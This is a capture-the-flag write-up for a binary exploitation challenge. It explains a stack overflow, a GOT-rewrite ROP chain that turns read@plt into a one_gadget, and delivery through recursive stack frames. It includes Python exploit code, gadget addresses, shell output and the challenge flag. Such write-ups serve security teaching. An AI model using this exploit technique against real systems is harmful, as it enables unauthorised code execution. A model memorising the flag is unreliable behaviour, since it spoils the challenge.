# ROP2Impress — Pwn (352 pts)

> ropper ropper on the -Wall, who's the slayest of them all?
> `nc 45.77.247.35 22004`

**Flag:** `CYBLTZ2026{5b7a9a9e58ee843e5909d3f00c5f90b639838af76d5f3358b955ed538fb813c2}`

```
No RELRO | No canary | NX | No PIE | glibc 2.39
```

```c
void gift(void) { __asm__("pop %rbx; ret"); __asm__("pop %rsp; ret"); }
void rop(void)  { char buf[0x50]; read(0, buf, 0x60); if (!buf[0]) rop(); return; }
int  main(void) { rop(); }
```

`read(0, buf, 0x60)` into `char buf[0x50]` overflows by exactly 16 bytes — saved `rbp` plus the
return address, nothing more. `if (!buf[0]) rop()` **recurses** when the first byte is `0`, so
you can stack frames and write one `0x60` block per frame.

## The constraints that pick the technique

`ropper` over the whole image, plus a byte-scan for `5f c3` / `5e c3` / `5a c3` / `58 c3` /
`0f 05`, confirms: **no `pop rdi`, no `pop rsi`, no `pop rdx`, no `pop rax`, no `syscall`.** The
only PLT import is `read`, and there is **no output function anywhere** — so a libc leak is
impossible. That normally screams ret2dlresolve, but without a `pop rdi` the resolved
`system` can't be handed `"/bin/sh"` cleanly, and the dlresolve bookkeeping is painful here.

Two observations collapse the whole thing instead:

**1. An arbitrary 4-byte *add* gadget.** Inside the init/fini stubs:

```asm
0x40110c:  add dword [rbp-0x3d], ebx ; nop ; ret
```

With `pop rbp` and `pop rbx` you pick both operands. Point it at `read`'s GOT entry
(`0x403350`, so `rbp = 0x40338d`) and the add runs **relative to libc** — no leak needed. After
the program's first `read` resolves `GOT[read]` to libc's `read`, adding the constant
`(one_gadget_off − read_off) mod 2^32` rewrites it into a **one_gadget**:

```python
Dsp = (0x583ec - libc.sym.read) & 0xffffffff   # 0x583ec: posix_spawn("/bin/sh") one_gadget
# chain: pop rbp; 0x40338d ; pop rbx; Dsp ; add   ->  GOT[read] = base + 0x583ec
```

`one_gadget` on the supplied libc:

```
0x583ec  posix_spawn(rsp+0xc, "/bin/sh", 0, rbx, rsp+0x50, environ)
  constraints:  rsp & 0xf == 0 ;  rax == NULL ;  rbx == NULL || (u16)[rbx] == 0
```

So after the patch, calling `read@plt` *is* `posix_spawn("/bin/sh")` — provided `rax == 0`,
`rbx == 0`, and `rsp` is 16-aligned. `rax` is zeroed with `mov eax,0 ; pop rbp ; ret`
(`0x401169`), `rbx` with `pop rbx`, and alignment with a bare `ret` (`0x401016`).

**2. A big stack to run it on.** The one_gadget's `posix_spawn` needs far more writable stack
than the 4 KB `.bss` affords — pivoting into `.bss` crashes inside glibc. The fix is to **not
pivot**: run the chain on the original stack, reached through the recursion.

## Delivery: two frames, unwind into the chain

The recursion gives contiguous `0x60` frames. Send **two**:

- **Frame 1** (`buf1[0] == 0` → recurse): first qword `0`, then the 8-gadget chain, padded to
  `0x60`.
- **Frame 2** (`buf2[0] != 0` → stop): filler, then its return address = `pop rbp ; ret`
  (`0x40110d`).

When frame 2 returns, its `pop rbp ; ret` swallows frame 1's leading `0` qword (the recursion
byte, harmless as a popped value) and lands execution on the rest of frame 1 — which is the
chain, now executing with `rsp` on the full process stack:

```python
chain  = p64(POP_RBP)+p64(RBP_ADD)+p64(POP_RBX)+p64(Dsp)+p64(ADD)   # GOT[read] += Dsp
chain += p64(MOVEAX0)+p64(0)        # rax = 0           (0x401169 pops a junk rbp)
chain += p64(POP_RBX)+p64(0)        # rbx = 0
chain += p64(RET)                   # 16-byte align
chain += p64(READ_PLT)              # read@plt -> one_gadget -> posix_spawn("/bin/sh")

buf1 = (p64(0) + chain).ljust(0x60, b'\x90')
buf2 = b'\x41'*0x50 + p64(0xdead) + p64(POP_RBP)
io.send(buf1); io.send(buf2)
```

Shell as `ctf`:

```
uid=10001(ctf) gid=10001(ctf)
CYBLTZ2026{5b7a9a9e58ee843e5909d3f00c5f90b639838af76d5f3358b955ed538fb813c2}
```

Full exploit: [`tools/rop2impress_solve.py`](../../tools/rop2impress_solve.py)

**Takeaway:** "no leak, no output" does not force ret2dlresolve. An `add [mem], reg` gadget is a
libc-relative GOT rewrite — patch an already-resolved PLT entry into a one_gadget and the
missing-leak problem disappears. And when a one_gadget needs real stack, keep the chain on the
original stack (here via the self-recursion) instead of pivoting into a cramped `.bss`.
